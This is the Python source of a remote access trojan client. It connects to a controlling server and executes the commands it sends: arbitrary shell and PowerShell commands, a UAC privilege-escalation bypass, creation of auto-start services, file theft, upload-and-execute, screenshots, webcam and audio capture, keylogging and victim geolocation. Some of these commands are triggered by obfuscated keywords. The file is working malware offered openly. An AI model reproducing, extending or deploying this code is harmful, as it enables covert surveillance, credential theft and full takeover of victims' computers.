import socket
import pickle
import zlib
import os
import time
import threading
import platform
import geocoder
import requests
import cv2
import numpy as np
from PIL import ImageGrab
from subprocess import Popen, PIPE
from sys import exit


from Specific.encrypt import Encryption
from Specific.uac_bypass import Bypass, is_running_as_admin
from Modules.Clients.stream import Stream
from Modules.Clients.cam import Cam
from Modules.Clients.audio import Audio
from Modules.Clients.keylogger import Keylogger
from Modules.Clients.talk import Talk
from Utilities.client import *


class Client:
	encrypt = Encryption()
	headersize = 10
	new_msg = True
	msg_len = 0
	full_msg = b''


	def __init__(self, server_ip='127.0.0.1', server_port=1200, encoding='latin-1'):
		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.ip = server_ip
		self.port = server_port
		self.encoding = encoding
		try:
			self.username = f'{os.environ["USERNAME"].capitalize()}@{platform.node()}'
		except:
			self.username = 'Anonymous@Unkown'


	@staticmethod
	def sub_shell(message, encoding, ret=True):
		shell = Popen(message, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
		if ret:
			return shell.stdout.read().decode(encoding).strip() + shell.stderr.read().decode(encoding).strip()
	

	def send_message(self, message):
		result = pickle.dumps(message)
		result = zlib.compress(result, 1)
		encrypted_msg = Client.encrypt.do_encrypt(result)
		result = bytes(f'{len(encrypted_msg):<{Client.headersize}}', self.encoding) + encrypted_msg
		self.s.send(result)


	def connect(self):
		try:
			self.s.connect((self.ip, self.port))
		except:
			exit(0)


	def listen(self):
		while True:
			try:
				while True:
					msg = self.s.recv(81920)

					if Client.new_msg:
						Client.msg_len = int(msg[:Client.headersize])
						Client.new_msg = False

					Client.full_msg += msg
					
					if len(Client.full_msg)-Client.headersize == Client.msg_len:
						decrypted_msg = Client.encrypt.do_decrypt(Client.full_msg[Client.headersize:])
						decompressed_msg = zlib.decompress(decrypted_msg)
						message = pickle.loads(decompressed_msg)['message']

						if message[:2].lower() == 'cd':
							try:
								os.chdir(message[3:])
								self.send_message({'message': f'{os.getcwd()}'})
							except:
								self.send_message({'message': f'Could not find directory {message[3:]}'})

						elif message[:7].lower() == 'elevate':
							try:
								threading.Thread(target=Bypass, args=[message[8:]], daemon=False).start()
								self.send_message({'message': f'Elevating privileges complete, program will be running as administrator within the next seconds!\nIf you are escelating privileges of this program, you will need to have duplicates option enabled.'})
							except:
								self.send_message({'message': f'Something went wrong when attempting to elevate privileges.'})

						elif message[:7].lower() == 'service':
							try:
								data = message[8:].split()
								assert len(data) == 3
								result = Client.sub_shell(f'sc {data[0]} {data[1]} binpath= {data[2]} start= auto', self.encoding).strip()
								self.send_message({'message': result})
							except Exception as e:
								print(e)
								self.send_message({'message': f'Something went wrong working with services.'})
	

						elif message[:8].lower() == 'download':
							try:
								args = message[9:]
								if message[-2:].lower() == '-e':
									args = message[9:-3]
								with open(args, 'rb') as f:
									self.send_message({'message': f'Download of {args} complete!', 'download': f.read()})
							except:
								self.send_message({'message': f'Download of {args} failed, please try again.'})
								
						elif message[:6].lower() == 'upload':
							try:
								args = message[7:]
								if message[-2:].lower() == '-e':
									args = message[7:-3]
								with open(args, 'wb') as f:
									f.write(pickle.loads(decompressed_msg)['image'])
								if message[-2:].lower() == '-e':
									Client.sub_shell(args, self.encoding)
								self.send_message({'message': f'Upload of {args} complete!'})
							except:
								self.send_message({'message': f'Upload of {args} failed.'})
								
						elif message.lower() == 'screenshot' or message.lower() == 'screenshot -s':
							try:
								img = ImageGrab.grab()
								frame = np.array(img)
								self.send_message({'message': f'Upload of screenshot complete!', 'screenshot': frame})
							except:
								self.send_message({'message': f'Upload of screenshot failed.'})

						elif message.lower() == 'devices':
							try:
								devices = 0
								sizes = []
								result = ''
								while True:
									cap = cv2.VideoCapture(devices)
									if cap.read()[0]:
										devices += 1
										width = int(cap.get(3))
										height = int(cap.get(4))
										sizes.append((width, height))
									else:
										break
									cap.release()
								
								for i, size in enumerate(sizes):
									result += f'\n  - Camera {i}: {size}'	
									if len(sizes) > 1:
										result += '\n'
								
								self.send_message({'message': f'Number of webcam devices is {devices}{result}'})
							except:
								self.send_message({'message': f'Something went wrong reading devices.'})   
						
						elif message[:6].lower() == 'webcam':
							try:
								args = message.lower().split()
								position = int(args[1])
								cam = cv2.VideoCapture(position)
								check, frame = cam.read()
								assert check
								self.send_message({'message': f'Upload of webcam screenshot complete!', 'webcam': frame})
							except:
								self.send_message({'message': f'Upload of webcam screenshot failed.'})
							else:
								cam.release()
								cv2.destroyAllWindows()

						elif message[:6].lower() == 'stream':
							try:
								args = message[7:].lower().split(':')
								assert len(args) == 2
								threading.Thread(target=Stream, args=[args[0], int(args[1]), self.encoding], daemon=True).start()
								self.send_message({'message': f'Stream running!'})
							except:
								self.send_message({'message': f'Stream failed to run (client).'})
						
						elif message[:3].lower() == 'cam':
							try:
								args = message[4:].lower().split()[:-1]
								assert len(args) == 2
								position = int(args[1])
								address = args[0].split(':')
								threading.Thread(target=Cam, args=[address[0], int(address[1]), self.encoding, position], daemon=True).start()
								self.send_message({'message': f'Cam running!'})
							except:
								self.send_message({'message': f'Cam failed to run (client).'})

						elif message[:5].lower() == 'audio':
							try:
								args = message[6:].lower().split(':')
								assert len(args) == 2
								threading.Thread(target=Audio, args=[args[0], int(args[1]), self.encoding], daemon=True).start()
								self.send_message({'message': f'Audio running!'})
							except:
								self.send_message({'message': f'Audio failed to run (client).'})

						elif message[:9].lower() == 'keylogger':
							try:
								args = message[10:].lower().split(':')
								assert len(args) == 2
								threading.Thread(target=Keylogger, args=[args[0], int(args[1]), self.encoding], daemon=True).start()
								self.send_message({'message': f'Keylogger running!'})
							except:
								self.send_message({'message': f'Keylogger failed to run (client).'})

						elif message[:4].lower() == 'talk':
							try:
								args = message[5:].lower().split(':')
								assert len(args) == 2
								threading.Thread(target=Talk, args=[args[0], int(args[1]), self.encoding], daemon=True).start()
								self.send_message({'message': f'Talk running!'})
							except:
								self.send_message({'message': f'Talk failed to run (client).'})

						elif message[:7].lower() == 'message':
							try:
								args = message[8:].split('=>')
								style = 0
								assert len(args) <= 3 and args[0] != ''
								if len(args) == 1:
									args.append(args[0])
									args[0] = 'Message'
								elif len(args) == 3:
									style = int(args[2])
								threading.Thread(target=show_message, args=[args[0], args[1], style], daemon=True).start()
								self.send_message({'message': f'Message shown!'})
							except:
								self.send_message({'message': f'Message failed to show.'})
					
						elif message[:4].lower() == 'open':
							try:
								args = message[5:].lower().split()
								assert len(args) == 1
								threading.Thread(target=open_browser, args=[args[0]], daemon=True).start()
								self.send_message({'message': f'Webbrowser opened!'})
							except:
								self.send_message({'message': f'Webbrowser failed to open.'})
						
						elif message[:2].lower() == 'ps':
							try:
								server_data = message.split()
								server_data.pop(0)
								data = ['powershell', '/c']
								for i, d in enumerate(server_data):
									data.insert(i + 2, d)
								self.send_message({'message': f'{Client.sub_shell(data, self.encoding).strip()}'})
							except:
								self.send_message({'message': f'Something went wrong using powershell, please try again.'})
						
						elif message[-2:].lower() == '-t':
							try:
								threading.Thread(target=Client.sub_shell, args=[message[:-3].split(), self.encoding, False], daemon=False).start()
								self.send_message({'message': 'Command running as a thread!'})
							except:
								self.send_message({'message': 'Command failed to run as a thread.'})								

						elif message[:15].lower() == 'dk7ad6mwo5apwr4':
							types = ['OS', 'COMPUTER', 'VERSION', 'EXACT VERSION', 'MACHINE', 'PROCESSOR', 'LOCAL IP']
							info = []
							zipz = []

							try:
								info = [x for x in platform.uname()]
							except:
								info = ['UNKOWN', 'UNKOWN', 'UNKOWN', 'UNKOWN', 'UNKOWN', 'UNKOWN']

							try:
								info.append(socket.gethostbyname(socket.gethostname()))
							except:
								info.append('UNKOWN')
								
							try:
								data = geocoder.ip('me').json['raw']
								for key, value in data.items():
									types.append(key.upper())
									if value == '':
										info.append('UNKOWN')
									else:
										info.append(value)
							except:
								types += ['IP', 'HOSTNAME', 'CITY', 'REGION', 'COUNTRY', 'LOC', 'POSTAL', 'ORG']
								info += ['UNKOWN', 'UNKOWN', 'UNKOWN', 'UNKOWN', 'UNKOWN', 'UNKOWN', 'UNKOWN', 'UNKOWN']

							for i in range(len(info)):
								zipz.append((types[i], info[i]))
							
							if message.lower() == 'dk7ad6mwo5apwr4khg':
								self.send_message({'message': ((self.username, bool(is_running_as_admin())), zipz)})
							else:
								self.send_message({'message': zipz})

						elif message.lower() == 'aij4sawxorng2u9w5ar7':
							self.send_message({'message': (self.username, bool(is_running_as_admin()))})

						elif message.lower() == 'aij4oaw4orn12u9w5ar7':
							self.send_message({'message': f'True'})

						else:
							result = Client.sub_shell(message.split(), self.encoding).strip()
							if result == '':
								result = 'Empty response.'
							self.send_message({'message': result})

						# Reset
						Client.new_msg = True
						Client.msg_len = 0
						Client.full_msg = b''
			except KeyboardInterrupt:
				continue
			except:
				exit(0)


if __name__ == '__main__':
	try:
		# data = requests.get('https://YOUR_HEROKU_URL.herokuapp.com/').json()
		# client = Client(data['ip'], data['port'], data['encoding'])
		client = Client()
		client.connect()
		client.listen()
	except:
		exit(0)